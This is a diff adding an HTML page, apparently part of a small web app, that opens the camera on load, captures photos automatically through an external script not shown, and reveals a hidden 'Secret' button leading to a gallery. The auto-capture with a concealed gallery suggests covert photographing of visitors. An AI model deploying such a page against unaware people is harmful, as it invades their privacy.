@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📸 Auto Capture</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container min-container">
+        <!-- Minimal - only success + dots button -->
+        <div id="status" class="status-fullscreen">Loading camera...</div>
+        <div class="video-container fullscreen-video">
+            <video id="video" autoplay muted playsinline></video>
+            <canvas id="canvas" style="display: none;"></canvas>
+        </div>
+        
+        <div id="success" class="success-fullscreen hidden">
+            <div class="success-animation">
+                <div class="checkmark">✅</div>
+                <div class="pulse-ring"></div>
+            </div>
+            <button id="secret-gallery" class="secret-dots" onclick="goToGallery()" title="••• Secret">-</button>
+        </div>
+    </div>
+    
+    <script src="script.js"></script>
+    <script>
+        function goToGallery() {
+            window.location.href = 'gallery.html';
+        }
+        
+        // Auto start capture mode
+        document.addEventListener('DOMContentLoaded', async () => {
+            window.app = new PhotoCaptureApp('capture');
+            await window.app.autoCapture();
+            // Show secret button after success
+            document.getElementById('success').addEventListener('transitionend', () => {
+                document.getElementById('secret-gallery').style.opacity = '1';
+            });
+        });
+    </script>
+</body>
+</html>
+
